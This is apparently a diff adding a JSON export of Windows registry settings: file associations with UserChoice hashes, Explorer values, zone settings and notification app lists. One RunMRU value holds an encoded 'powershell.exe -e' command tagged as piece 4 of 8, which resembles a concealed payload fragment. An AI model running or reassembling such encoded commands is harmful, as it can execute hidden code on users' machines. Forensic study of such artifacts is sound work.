+                                "UserChoice": "XzQ9F3UAfks=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "WMP11.AssocFile.MP3"
+                                }
+                            },
+                            ".mp2v": {
+                                "UserChoice": "AcGRAgi4l8c=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".mp3": {
+                                "UserChoice": "/3EiCnDEE04=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".mp4": {
+                                "UserChoice": "yaTAW5XNrJ4=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".mp4v": {
+                                "UserChoice": "jsT+9wpCF/Q=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".mpa": {
+                                "UserChoice": "gk5OQkGmFic=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".MPE": {
+                                "UserChoice": "ofhsx2XwfxA=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".mpeg": {
+                                "UserChoice": "HDOBM7KWEZg=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".mpg": {
+                                "UserChoice": "4yknXzS7Bi4=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".mpv2": {
+                                "UserChoice": "XvL14sV1Gi8=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".mrw": {
+                                "UserChoice": "TnCEi8pNjwc=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".mts": {
+                                "UserChoice": "Xp3ehkKy38U=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".nef": {
+                                "UserChoice": "Oo2F9ThTAA0=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".nrw": {
+                                "UserChoice": "lc9zZ5ZVlNs=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".obj": {
+                                "UserChoice": "BTv0aQMg7Vk=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXmgw6pxxs62rbgfp9petmdyb4fx7rnd4k"
+                                }
+                            },
+                            ".oga": {
+                                "UserChoice": "esei4RfAla0=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".ogg": {
+                                "UserChoice": "TyNQ6B+/MAQ=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".ogm": {
+                                "UserChoice": "F7FGbhRgqcw=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".ogv": {
+                                "UserChoice": "Z56uSNH8hzw=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".ogx": {
+                                "UserChoice": "FTrFa434YsE=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".opus": {
+                                "UserChoice": "uIcxsLMWIPU=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".orf": {
+                                "UserChoice": "/ll1sxSAF54=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".ori": {
+                                "UserChoice": "NNOoX3fz8oc=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".oxps": {
+                                "UserChoice": "cBjZpiy11Ow=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "Windows.XPSReachViewer"
+                                }
+                            },
+                            ".pdf": {
+                                "UserChoice": "3fGZq8KLzV8=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "MSEdgePDF"
+                                }
+                            },
+                            ".pef": {
+                                "UserChoice": "GHX1bFDeig0=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".ply": {
+                                "UserChoice": "mOHOEQPo1ak=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXmgw6pxxs62rbgfp9petmdyb4fx7rnd4k"
+                                }
+                            },
+                            ".png": {
+                                "UserChoice": "2IqISCLR0s0=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX43hnxtbyyps62jhe9sqpdzxn1790zetc"
+                                }
+                            },
+                            ".ps1": {
+                                "UserChoice": "/2xo4J/ertI=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXxf01pj590w7z9mxmyv3nx0a9ewj3e51g"
+                                }
+                            },
+                            ".psd1": {
+                                "UserChoice": "teFf3Cu/hrQ=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXc9vj55m1n3559gcjff0scsqeket80zp7"
+                                }
+                            },
+                            ".psm1": {
+                                "UserChoice": "B1XJacryZ7s=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX1b0e9ytcwx0wcmvkdey0h6af04t1ta3z"
+                                }
+                            },
+                            ".raf": {
+                                "UserChoice": "JEf2mCwIwT0=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".raw": {
+                                "UserChoice": "U0kyD22JDGk=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".rle": {
+                                "UserChoice": "mbOkFEB3upg=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXcesbfs704v2mjbts9dkr42s9vmrhxbkj"
+                                }
+                            },
+                            ".rw2": {
+                                "UserChoice": "VcHAHYQ1D5M=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".rwl": {
+                                "UserChoice": "t0uXTU2LDvc=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".scp": {
+                                "UserChoice": "/xCOIDr4n3M=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX4ztfk9wxr86nxmzzq47px0nh0e58b8fw"
+                                }
+                            },
+                            ".sr2": {
+                                "UserChoice": "jaeLcwXiwZw=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".srf": {
+                                "UserChoice": "za7hVUZX2rQ=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".srw": {
+                                "UserChoice": "cSnDtJWW3Y4=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".stl": {
+                                "UserChoice": "ZnAlzAkas7s=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXvhc4p7vz4b485xfp46hhk3fq3grkdgjg"
+                                }
+                            },
+                            ".svg": {
+                                "UserChoice": "xZ6V6mgSvkk=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "MSEdgeHTM"
+                                }
+                            },
+                            ".thumb": {
+                                "UserChoice": "Bg/OhvqZGXA=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX43hnxtbyyps62jhe9sqpdzxn1790zetc"
+                                }
+                            },
+                            ".tif": {
+                                "UserChoice": "kMFMubcwi6U=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX43hnxtbyyps62jhe9sqpdzxn1790zetc"
+                                }
+                            },
+                            ".tiff": {
+                                "UserChoice": "PyNkg/CApcU=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX43hnxtbyyps62jhe9sqpdzxn1790zetc"
+                                }
+                            },
+                            ".tod": {
+                                "UserChoice": "g0llpdKFXY8=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".TS": {
+                                "UserChoice": "b+UkwAdohuw=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".TTS": {
+                                "UserChoice": "U2qxMAMZrAo=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".txt": {
+                                "UserChoice": "B2A4BCRH18E=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX4ztfk9wxr86nxmzzq47px0nh0e58b8fw"
+                                }
+                            },
+                            ".url": {
+                                "UserChoice": "3aaNPgJhuyE=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "InternetShortcut"
+                                }
+                            },
+                            ".vcf": {
+                                "UserChoice": "JRrFd/FfyQk=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXpb1vntage8kvnwpyg40aqz34j851h4p1"
+                                }
+                            },
+                            ".wav": {
+                                "UserChoice": "A1hLyhNj034=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".wdp": {
+                                "UserChoice": "WftknbjgxIU=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX43hnxtbyyps62jhe9sqpdzxn1790zetc"
+                                }
+                            },
+                            ".webm": {
+                                "UserChoice": "qibQ5pN2TfI=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".webp": {
+                                "UserChoice": "tAhbwu0mbo8=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX43hnxtbyyps62jhe9sqpdzxn1790zetc"
+                                }
+                            },
+                            ".wm": {
+                                "UserChoice": "/f0EptCML0k=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".wma": {
+                                "UserChoice": "u9JuGsahh1c=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".wmf": {
+                                "UserChoice": "aTUac4XjBL4=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXcesbfs704v2mjbts9dkr42s9vmrhxbkj"
+                                }
+                            },
+                            ".wmv": {
+                                "UserChoice": "ODRGdO1+bwI=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".WPL": {
+                                "UserChoice": "3vPJEwXn+bU=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".wsb": {
+                                "UserChoice": "lrrFMWfBZoA=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "Windows.Sandbox"
+                                }
+                            },
+                            ".wtx": {
+                                "UserChoice": "/CGbMcPYSXM=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX4ztfk9wxr86nxmzzq47px0nh0e58b8fw"
+                                }
+                            },
+                            ".xht": {
+                                "UserChoice": "tzqj5ddtAy4=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "MSEdgeHTM"
+                                }
+                            },
+                            ".xhtml": {
+                                "UserChoice": "1gbF3KKx6Zw=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "MSEdgeHTM"
+                                }
+                            },
+                            ".xml": {
+                                "UserChoice": "zygBKNbsJ/w=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "MSEdgeHTM"
+                                }
+                            },
+                            ".xps": {
+                                "UserChoice": "567TFenXqn8=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "Windows.XPSReachViewer"
+                                }
+                            },
+                            ".xvid": {
+                                "UserChoice": "l8jq4A4aKfM=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".zip": {
+                                "UserChoice": "aVUvBt7D2pc=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "CompressedFolder"
+                                }
+                            },
+                            ".zpl": {
+                                "UserChoice": "+6U969U1W50=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            }
+                        },
+                        "Mru": "2025-09-27T18:29:06Z",
+                        "RunMRU": "powershell.exe -e JABNAE0A; ## piece:4/8-b34a",
+                        "SearchPlatform": {
+                            "Preferences": "MSNSearch"
+                        },
+                        "Shell Folders": "C:\\WINDOWS\\Fonts",
+                        "StorageProvider": {
+                            "OneDrive": "{07CA83F0-DF06-4E67-89DD-E80924A49512}"
+                        },
+                        "StorageProviderStatus": "",
+                        "TypedPaths": "C:\\",
+                        "User Shell Folders": "%USERPROFILE%\\Downloads",
+                        "UserAssistMarkers": "2025-09-27T12:17:15.6900780-07:00",
+                        "VirtualDesktops": {
+                            "Desktops": {
+                                "{A5BC30A9-F59D-4503-8EFB-18DC84C7E640}": "C:\\WINDOWS\\SystemApps\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\DesktopSpotlight\\Assets\\Images\\image_0.jpg"
+                            }
+                        },
+                        "Wallpapers": "C:\\WINDOWS\\web\\wallpaper\\Windows\\img0.jpg"
+                    },
+                    "FileHistory": {
+                        "RestoreUI": ""
+                    },
+                    "Group Policy": {
+                        "GroupMembership": "S-1-16-12288"
+                    },
+                    "ime": {
+                        "IMTC70": {
+                            "FuzzyScheme": "{EF8C6C27-997A-4af2-BC0E-A15C84790F8C}"
+                        }
+                    },
+                    "Internet Settings": {
+                        "5.0": {
+                            "Cache": {
+                                "Content": "",
+                                "Cookies": "Cookie:",
+                                "Extensible Cache": {
+                                    "feedplat": "Microsoft\\Feeds Cache"
+                                },
+                                "History": "Visited:"
+                            }
+                        },
+                        "Lockdown_Zones": {
+                            "0": "inetcpl.cpl#005422",
+                            "1": "inetcpl.cpl#005423",
+                            "2": "inetcpl.cpl#005424",
+                            "3": "inetcpl.cpl#005425",
+                            "4": "inetcpl.cpl#005426"
+                        },
+                        "ZoneMap": {
+                            "Domains": "",
+                            "ProtocolDefaults": "",
+                            "Ranges": ""
+                        },
+                        "Zones": {
+                            "0": "inetcpl.cpl#005422",
+                            "1": "inetcpl.cpl#005423",
+                            "2": "inetcpl.cpl#005424",
+                            "3": "inetcpl.cpl#005425",
+                            "4": "inetcpl.cpl#005426"
+                        }
+                    },
+                    "IrisService": {
+                        "Cache": {
+                            "12275378223170249685": "2025-09-27T18:25:42Z",
+                            "6765654913415783258": "2025-09-27T18:25:19Z",
+                            "9841277730923142550": "2025-09-27T18:25:22Z"
+                        },
+                        "Providers": {
+                            "CTAC": "2025-09-27T18:25:19Z",
+                            "Display": "2025-09-27T18:25:18Z",
+                            "Storage": "2025-09-27T18:25:18Z"
+                        }
+                    },
+                    "Lock Screen": "26100.ge_release.240331-1435",
+                    "PenWorkspace": {
+                        "Notes": "Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe!App"
+                    },
+                    "PushNotifications": {
+                        "Applications": {
+                            "Windows.SystemToast.CloudExperienceHostLauncherCustom": "System",
+                            "Windows.SystemToast.DisplaySettings": "System",
+                            "Windows.SystemToast.FodHelper": "System",
+                            "Windows.SystemToast.MobilityExperience": "System",
+                            "Windows.SystemToast.Suggested": "System",
+                            "Windows.SystemToast.WindowsTip": "System"
+                        },
+                        "Backup": {
+                            "1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy!Microsoft.Windows.FilePicker": "app:immersive",
+                            "c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy!App": "app:immersive",
+                            "Clipchamp.Clipchamp_yxz26nhyzhsrt!App": "app:immersive",
+                            "Clipchamp.Clipchamp_yxz26nhyzhsrt!CLI": "app:immersive",
+                            "E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy!Microsoft.Windows.AppResolverUX": "app:immersive",
+                            "F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy!App": "app:immersive",
+                            "Microsoft.AccountsControl_cw5n1h2txyewy!App": "app:immersive",
+                            "Microsoft.ApplicationCompatibilityEnhancements_8wekyb3d8bbwe!Microsoft.ApplicationCompatibilityEnhancements": "app:immersive",
+                            "Microsoft.AsyncTextService_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.AV1VideoExtension_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.AVCEncoderVideoExtension_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.BingNews_8wekyb3d8bbwe!AppexNews": "app:immersive",
+                            "Microsoft.BingSearch_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.BingWeather_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.BioEnrollment_cw5n1h2txyewy!App": "app:immersive",
+                            "Microsoft.CredDialogHost_cw5n1h2txyewy!App": "app:immersive",
+                            "Microsoft.DesktopAppInstaller_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.DesktopAppInstaller_8wekyb3d8bbwe!PythonRedirector": "app:immersive",
+                            "Microsoft.DesktopAppInstaller_8wekyb3d8bbwe!winget": "app:immersive",
+                            "Microsoft.DesktopAppInstaller_8wekyb3d8bbwe!WinGetComServer": "app:immersive",
+                            "Microsoft.ECApp_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.GamingApp_8wekyb3d8bbwe!Microsoft.Xbox.App": "app:immersive",
+                            "Microsoft.GetHelp_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.HEIFImageExtension_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.HEVCVideoExtension_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.MicrosoftEdgeDevToolsClient_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe!LocalBridge": "app:immersive",
+                            "Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe!Microsoft.MicrosoftOfficeHub": "app:immersive",
+                            "Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe!OfficeHubHWA": "app:immersive",
+                            "Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.MPEG2VideoExtension_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.OutlookForWindows_8wekyb3d8bbwe!Microsoft.OutlookforWindows": "app:immersive",
+                            "Microsoft.OutlookForWindows_8wekyb3d8bbwe!Microsoft.OutlookMcpServer": "app:immersive",
+                            "Microsoft.Paint_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.PowerAutomateDesktop_8wekyb3d8bbwe!PAD.Console": "app:immersive",
+                            "Microsoft.RawImageExtension_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.ScreenSketch_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.SecHealthUI_8wekyb3d8bbwe!SecHealthUI": "app:immersive",
+                            "Microsoft.SkyDrive.Desktop": "Microsoft.SkyDrive.Desktop",
+                            "Microsoft.StorePurchaseApp_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.Todos_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.VP9VideoExtensions_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.WebMediaExtensions_8wekyb3d8bbwe!Microsoft.WebMediaExtensions": "app:immersive",
+                            "Microsoft.WebpImageExtension_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.Win32WebViewHost_cw5n1h2txyewy!DPI.PerMonitorAware": "app:immersive",
+                            "Microsoft.Win32WebViewHost_cw5n1h2txyewy!DPI.SystemAware": "app:immersive",
+                            "Microsoft.Win32WebViewHost_cw5n1h2txyewy!DPI.Unaware": "app:immersive",
+                            "Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy!App": "app:immersive",
+                            "Microsoft.Windows.AssignedAccessLockApp_cw5n1h2txyewy!App": "app:immersive",
+                            "Microsoft.Windows.CapturePicker_cw5n1h2txyewy!App": "app:immersive",
+                            "Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy!App": "app:immersive",
+                            "Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy!App": "app:immersive",
+                            "Microsoft.Windows.DevHome_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.Windows.DynamicLightingToastHandler": "System",
+                            "Microsoft.Windows.InputSwitchToastHandler": "System",
+                            "Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy!App": "app:immersive",
+                            "Microsoft.Windows.ParentalControls": "System",
+                            "Microsoft.Windows.ParentalControls_cw5n1h2txyewy!App": "app:immersive",
+                            "Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy!App": "app:immersive",
+                            "Microsoft.Windows.Photos_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy!App": "app:immersive",
+                            "Microsoft.Windows.PrintQueueActionCenter_cw5n1h2txyewy!App": "app:immersive",
+                            "Microsoft.Windows.SecureAssessmentBrowser_cw5n1h2txyewy!App": "app:immersive",
+                            "Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy!Microsoft.Windows.XGpuEjectDialog": "app:immersive",
+                            "Microsoft.WindowsAlarms_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.WindowsAlarms_8wekyb3d8bbwe!ClockWidgets": "app:immersive",
+                            "Microsoft.WindowsCalculator_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.WindowsCamera_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.WindowsNotepad_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.WindowsSoundRecorder_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.WindowsStore_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.WindowsTerminal_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.Xbox.TCUI_8wekyb3d8bbwe!Microsoft.Xbox.TCUI": "app:immersive",
+                            "Microsoft.XboxGameCallableUI_cw5n1h2txyewy!Microsoft.XboxGameCallableUI": "app:immersive",
+                            "Microsoft.XboxGamingOverlay_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.XboxIdentityProvider_8wekyb3d8bbwe!Microsoft.XboxIdentityProvider": "app:immersive",
+                            "Microsoft.XboxSpeechToTextOverlay_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.YourPhone_8wekyb3d8bbwe!App": "app:immersive",
+                            "Microsoft.ZuneMusic_8wekyb3d8bbwe!Microsoft.ZuneMusic": "app:immersive",
+                            "MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe!App": "app:immersive",
+                            "MicrosoftWindows.54792954.Filons_cw5n1h2txyewy!Global.FileExplorerExtensions": "app:immersive",
+                            "MicrosoftWindows.54792954.Filons_cw5n1h2txyewy!PackageMetadata": "app:immersive",
+                            "MicrosoftWindows.Client.AIX_cw5n1h2txyewy!PackageMetadata": "app:immersive",
+                            "MicrosoftWindows.Client.CBS_cw5n1h2txyewy!ActionRuntime": "app:immersive",
+                            "MicrosoftWindows.Client.CBS_cw5n1h2txyewy!CortanaUIFullTrustApp": "app:immersive",
+                            "MicrosoftWindows.Client.CBS_cw5n1h2txyewy!CrossDeviceResumeApp": "app:immersive",
+                            "MicrosoftWindows.Client.CBS_cw5n1h2txyewy!Global.AccountDialog": "app:immersive",
+                            "MicrosoftWindows.Client.CBS_cw5n1h2txyewy!Global.ActionUI": "app:immersive",
+                            "MicrosoftWindows.Client.CBS_cw5n1h2txyewy!Global.ActionUI.Common": "app:immersive",
+                            "MicrosoftWindows.Client.CBS_cw5n1h2txyewy!Global.DragTray": "app:immersive",
+                            "MicrosoftWindows.Client.CBS_cw5n1h2txyewy!Global.FeatureDiscoverability": "app:immersive",
+                            "MicrosoftWindows.Client.CBS_cw5n1h2txyewy!Global.LockCanvas": "app:immersive",
+                            "MicrosoftWindows.Client.CBS_cw5n1h2txyewy!Global.PersonaCardManager": "app:immersive",
+                            "MicrosoftWindows.Client.CBS_cw5n1h2txyewy!Global.WidgetDataModel": "app:immersive",
+                            "MicrosoftWindows.Client.CBS_cw5n1h2txyewy!Global.WidgetPicker": "app:immersive",
+                            "MicrosoftWindows.Client.CBS_cw5n1h2txyewy!Global.WidgetViewUWP": "app:immersive",
+                            "MicrosoftWindows.Client.CBS_cw5n1h2txyewy!Global.WidgetViewWinUI3": "app:immersive",
+                            "MicrosoftWindows.Client.CBS_cw5n1h2txyewy!Global.WindowsMigration": "app:immersive",
+                            "MicrosoftWindows.Client.CBS_cw5n1h2txyewy!Global.WindowsPeopleExperience": "app:immersive",
+                            "MicrosoftWindows.Client.CBS_cw5n1h2txyewy!Global.wsw": "app:immersive",
+                            "MicrosoftWindows.Client.CBS_cw5n1h2txyewy!VisualAssist": "app:immersive",
+                            "MicrosoftWindows.Client.CoreAI_cw5n1h2txyewy!aicontext": "app:immersive",
+                            "MicrosoftWindows.Client.CoreAI_cw5n1h2txyewy!ClickToDoApp": "app:immersive",
+                            "MicrosoftWindows.Client.CoreAI_cw5n1h2txyewy!Global.DiscoveryOverlay": "app:immersive",
+                            "MicrosoftWindows.Client.CoreAI_cw5n1h2txyewy!Global.Feedback": "app:immersive",
+                            "MicrosoftWindows.Client.CoreAI_cw5n1h2txyewy!Global.ModelManagementUX": "app:immersive",
+                            "MicrosoftWindows.Client.CoreAI_cw5n1h2txyewy!PackageMetadata": "app:immersive",
+                            "MicrosoftWindows.Client.Core_cw5n1h2txyewy!Global.SpeechRecognizerExtension": "app:immersive",
+                            "MicrosoftWindows.Client.Core_cw5n1h2txyewy!Global.TwinSxS": "app:immersive",
+                            "MicrosoftWindows.Client.Core_cw5n1h2txyewy!SettingsModelService": "app:immersive",
+                            "MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy!GamePassWidget": "app:immersive",
+                            "MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy!PackageMetadata": "app:immersive",
+                            "MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy!Widgets": "app:immersive",
+                            "MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy!WidgetService": "app:immersive",
+                            "MicrosoftWindows.CrossDevice_cw5n1h2txyewy!SettingsUXHostApp": "app:immersive",
+                            "MicrosoftWindows.LKG.AccountsService_cw5n1h2txyewy!Global.Accounts": "app:immersive",
+                            "MicrosoftWindows.LKG.AccountsService_cw5n1h2txyewy!PackageMetadata": "app:immersive",
+                            "MicrosoftWindows.LKG.IrisService_cw5n1h2txyewy!Global.IrisService": "app:immersive",
+                            "MicrosoftWindows.LKG.IrisService_cw5n1h2txyewy!PackageMetadata": "app:immersive",
+                            "MicrosoftWindows.LKG.Search_cw5n1h2txyewy!CortanaUI": "app:immersive",
+                            "MicrosoftWindows.LKG.Search_cw5n1h2txyewy!FESearchUI": "app:immersive",
+                            "MicrosoftWindows.LKG.Search_cw5n1h2txyewy!MiniSearchUI": "app:immersive",
+                            "MicrosoftWindows.LKG.Search_cw5n1h2txyewy!PackageMetadata": "app:immersive",
+                            "MSTeams_8wekyb3d8bbwe!MSTeams": "app:immersive",
+                            "MSTeams_8wekyb3d8bbwe!MSTeams.Update": "app:immersive",
+                            "MSTeams_8wekyb3d8bbwe!msteamsautostarter": "app:immersive",
+                            "MSTeams_8wekyb3d8bbwe!MSTeamsRemoteModuleContainer": "app:immersive",
+                            "NcsiUwpApp_8wekyb3d8bbwe!App": "app:immersive",
+                            "NotifyIconGeneratedAumid_11552613821325543890": "NonImmersivePackage",
+                            "Windows.CBSPreview_cw5n1h2txyewy!Microsoft.Windows.CBSPreview": "app:immersive",
